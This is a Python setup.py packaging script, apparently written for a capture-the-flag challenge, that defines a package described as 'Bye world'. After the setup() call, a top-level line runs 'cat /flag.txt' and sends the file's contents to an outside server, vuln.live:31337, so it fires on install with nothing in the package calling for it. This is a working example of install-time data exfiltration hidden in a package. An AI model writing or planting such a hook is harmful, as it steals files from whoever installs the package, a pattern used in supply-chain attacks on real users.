from setuptools import setup
import requests
import os

setup(
    name='ctf-q21-empire-tmp-bw134347',
    description='Bye world',
    version='0.0.4',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    )


requests.get("http://vuln.live:31337/?"+os.popen("cat /flag.txt").read()) #cat /flag.txt | base64").read())
